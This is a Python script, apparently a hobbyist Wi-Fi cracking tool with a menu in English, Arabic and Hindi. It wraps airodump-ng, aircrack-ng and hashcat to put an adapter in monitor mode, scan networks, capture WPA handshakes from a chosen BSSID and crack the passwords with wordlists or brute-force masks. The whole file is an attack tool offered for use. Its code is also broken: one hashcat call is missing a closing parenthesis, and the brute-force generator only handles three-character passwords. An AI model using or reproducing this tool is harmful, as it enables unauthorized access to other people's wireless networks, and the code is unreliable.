import subprocess
from scapy.all import *
import os
from colorama import init, Fore, Style

# Initialize colorama
init()

# Language dictionaries for English, Arabic, and Hindi
languages = {
    'en': {
        'menu': "Menu:",
        'option_1': "1. Install Required Tools",
        'option_2': "2. List Network Adapters",
        'option_3': "3. Scan Networks",
        'option_4': "4. Capture Packets",
        'option_5': "5. Create Wordlist",
        'option_6': "6. Crack Password (CPU)",
        'option_7': "7. Crack Password (GPU with Hashcat)",
        'option_8': "8. Crack Password Without Wordlist (Custom Input with Aircrack-ng)",
        'option_9': "9. Crack Password Without Wordlist (Custom Input with Hashcat)",
        'option_10': "10. Exit",
        'invalid_choice': "Invalid choice. Please try again.",
        'exit_message': "Exiting...",
        'available_networks': "Available networks:"
    },
    'ar': {
        'menu': "القائمة:",
        'option_1': "1. تثبيت الأدوات المطلوبة",
        'option_2': "2. عرض محولات الشبكة",
        'option_3': "3. فحص الشبكات",
        'option_4': "4. التقاط الحزم",
        'option_5': "5. إنشاء قائمة كلمات المرور",
        'option_6': "6. كسر كلمة المرور (CPU)",
        'option_7': "7. كسر كلمة المرور (GPU مع Hashcat)",
        'option_8': "8. كسر كلمة المرور بدون قائمة كلمات مرور (إدخال مخصص مع Aircrack-ng)",
        'option_9': "9. كسر كلمة المرور بدون قائمة كلمات مرور (إدخال مخصص مع Hashcat)",
        'option_10': "10. خروج",
        'invalid_choice': "اختيار غير صالح. حاول مرة اخرى.",
        'exit_message': "جارٍ الخروج...",
        'available_networks': "الشبكات المتاحة:"
    },
    'hi': {
        'menu': "मेनू:",
        'option_1': "1. आवश्यक उपकरण स्थापित करें",
        'option_2': "2. नेटवर्क एडेप्टर सूचीबद्ध करें",
        'option_3': "3. नेटवर्क स्कैन करें",
        'option_4': "4. पैकेट कैप्चर करें",
        'option_5': "5. वर्डलिस्ट बनाएं",
        'option_6': "6. पासवर्ड क्रैक करें (CPU)",
        'option_7': "7. पासवर्ड क्रैक करें (GPU के साथ Hashcat)",
        'option_8': "8. बिना वर्डलिस्ट के पासवर्ड क्रैक करें (Aircrack-ng के साथ कस्टम इनपुट)",
        'option_9': "9. बिना वर्डलिस्ट के पासवर्ड क्रैक करें (Hashcat के साथ कस्टम इनपुट)",
        'option_10': "10. बाहर निकलें",
        'invalid_choice': "अमान्य विकल्प। कृपया पुन: प्रयास करें।",
        'exit_message': "बाहर निकल रहा है...",
        'available_networks': "उपलब्ध नेटवर्क:"
    }
}

# Function to show the banner
def show_banner():
    banner = f"""
{Fore.RED}{Style.BRIGHT}
 _    _            _     _ 
| |  | |          | |   (_)
| |__| | __ _  ___| |__  _ 
|  __  |/ _` |/ __| '_ \| |
| |  | | (_| | (__| | | | |
|_|  |_|\__,_|\___|_| |_|_|  
{Style.RESET_ALL}
"""
    print(banner)

# Function to select language
def select_language():
    print("Select your language / اختر لغتك / अपनी भाषा चुनें:")
    print("1. English")
    print("2. العربية")
    print("3. हिंदी")
    
    lang_choice = input("Enter your choice (1/2/3): ")
    if lang_choice == '1':
        return 'en'
    elif lang_choice == '2':
        return 'ar'
    elif lang_choice == '3':
        return 'hi'
    else:
        print("Invalid choice, defaulting to English.")
        return 'en'

# Function to list network adapters
def list_network_adapters():
    result = subprocess.run(['iwconfig'], capture_output=True, text=True)
    lines = result.stdout.split('\n')
    adapters = [line.split()[0] for line in lines if 'IEEE' in line]
    return adapters

# Function to enable monitor mode
def enable_monitor_mode(interface):
    subprocess.run(['sudo', 'ifconfig', interface, 'down'], check=True)
    subprocess.run(['sudo', 'iwconfig', interface, 'mode', 'monitor'], check=True)
    subprocess.run(['sudo', 'ifconfig', interface, 'up'], check=True)
    print(f"Enabled monitor mode on {interface}")

# Function to disable monitor mode
def disable_monitor_mode(interface):
    subprocess.run(['sudo', 'ifconfig', interface, 'down'], check=True)
    subprocess.run(['sudo', 'iwconfig', interface, 'mode', 'managed'], check=True)
    subprocess.run(['sudo', 'ifconfig', interface, 'up'], check=True)
    print(f"Disabled monitor mode on {interface}")

# Function to scan networks
def scan_networks(interface, show_hidden, lang_dict):
    networks = []
    
    def packet_handler(packet):
        if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
            ssid = packet[Dot11Elt].info.decode(errors='ignore')
            bssid = packet[Dot11].addr2
            if ssid == '' and show_hidden:
                ssid = '<Hidden>'
            if {'ssid': ssid, 'bssid': bssid} not in networks:
                networks.append({'ssid': ssid, 'bssid': bssid})

    print(f"Scanning for networks on {interface}...")
    enable_monitor_mode(interface)
    sniff(iface=interface, prn=packet_handler, timeout=10)
    disable_monitor_mode(interface)

    print(lang_dict['available_networks'])
    for i, net in enumerate(networks):
        print(f"{i + 1}. SSID: {net['ssid']} | BSSID: {net['bssid']}")
    
    return networks

# Function to capture packets
def capture_packets(interface, bssid, lang_dict):
    print(f"Capturing packets on {interface} for BSSID {bssid}...")
    enable_monitor_mode(interface)
    subprocess.run(["airodump-ng", interface, "-w", "capture", "--output-format", "cap", "--bssid", bssid], check=True)
    disable_monitor_mode(interface)

# Function to create wordlist
def create_wordlist(lang_dict):
    filename = input("Enter the filename for your wordlist: ")
    print("Enter words for the wordlist (type 'done' when finished):")
    with open(filename, 'w') as f:
        while True:
            word = input("> ")
            if word.lower() == 'done':
                break
            f.write(word + "\n")
    print(f"Wordlist saved as {filename}")

# Function to generate custom input for password cracking
def generate_custom_input(lang_dict):
    length = int(input("Enter the length of the password to crack: "))
    use_uppercase = input("Include uppercase letters? (y/n): ").lower() == 'y'
    use_lowercase = input("Include lowercase letters? (y/n): ").lower() == 'y'
    use_digits = input("Include digits? (y/n): ").lower() == 'y'
    use_special = input("Include special characters? (y/n): ").lower() == 'y'

    charset = ''
    if use_uppercase:
        charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    if use_lowercase:
        charset += 'abcdefghijklmnopqrstuvwxyz'
    if use_digits:
        charset += '0123456789'
    if use_special:
        charset += '!@#$%^&*()-_=+[]{}|;:<>,.?/~`'

    return charset, length

# Function to crack password using aircrack or hashcat
def crack_password(cap_file, wordlist=None, use_gpu=False, custom_input=None, use_hashcat=False):
    if wordlist:
        if use_gpu:
            print(f"Cracking password using {wordlist} with Hashcat...")
            subprocess.run(["hashcat", "-m", "2500", cap_file, wordlist], check=True)
        else:
            print(f"Cracking password using {wordlist} with Aircrack-ng...")
            subprocess.run(["aircrack-ng", "-w", wordlist, cap_file], check=True)
    elif custom_input:
        charset, length = custom_input
        if use_hashcat:
            # Construct Hashcat mask based on user input
            hashcat_mask = '?1' * length
            hashcat_charsets = f'-1 {charset}'

            print(f"Cracking password using custom input with Hashcat...")
            subprocess.run(["hashcat", "-m", "2500", hashcat_charsets, cap_file, hashcat_mask], check=True
        else:
            print(f"Cracking password using custom input with Aircrack-ng...")
            wordlist_file = "custom_wordlist.txt"
            with open(wordlist_file, 'w') as f:
                for ch1 in charset:
                    for ch2 in charset:
                        for ch3 in charset:
                            # Continue this for the length of the password
                            if length == 3:
                                f.write(f"{ch1}{ch2}{ch3}\n")
                            # Add more nested loops for longer passwords

            subprocess.run(["aircrack-ng", "-w", wordlist_file, cap_file], check=True)

# Install tools
def install_tools():
    print("Installing required tools...")
    subprocess.run(['sudo', 'apt', 'install', 'aircrack-ng', 'hashcat', 'iwconfig'], check=True)

# Main function
def main():
    lang = select_language()
    lang_dict = languages[lang]
    
    show_banner()
    
    while True:
        print(f"\n{lang_dict['menu']}")
        print(lang_dict['option_1'])
        print(lang_dict['option_2'])
        print(lang_dict['option_3'])
        print(lang_dict['option_4'])
        print(lang_dict['option_5'])
        print(lang_dict['option_6'])
        print(lang_dict['option_7'])
        print(lang_dict['option_8'])
        print(lang_dict['option_9'])
        print(lang_dict['option_10'])

        choice = input("Select an option: ")
        
        if choice == '1':
            install_tools()
        elif choice == '2':
            adapters = list_network_adapters()
            for adapter in adapters:
                print(adapter)
        elif choice == '3':
            interface = input("Enter interface for scanning: ")
            show_hidden = input("Show hidden networks? (y/n): ").lower() == 'y'
            scan_networks(interface, show_hidden, lang_dict)
        elif choice == '4':
            interface = input("Enter interface for capturing: ")
            bssid = input("Enter BSSID to capture: ")
            capture_packets(interface, bssid, lang_dict)
        elif choice == '5':
            create_wordlist(lang_dict)
        elif choice == '6':
            cap_file = input("Enter the capture file: ")
            wordlist = input("Enter wordlist file: ")
            crack_password(cap_file, wordlist=wordlist)
        elif choice == '7':
            cap_file = input("Enter the capture file: ")
            wordlist = input("Enter wordlist file: ")
            crack_password(cap_file, wordlist=wordlist, use_gpu=True)
        elif choice == '8':
            cap_file = input("Enter the capture file: ")
            custom_input = generate_custom_input(lang_dict)
            crack_password(cap_file, custom_input=custom_input)
        elif choice == '9':
            cap_file = input("Enter the capture file: ")
            custom_input = generate_custom_input(lang_dict)
            crack_password(cap_file, custom_input=custom_input, use_hashcat=True)
        elif choice == '10':
            print(lang_dict['exit_message'])
            break
        else:
            print(lang_dict['invalid_choice'])

if __name__ == "__main__":
    main()
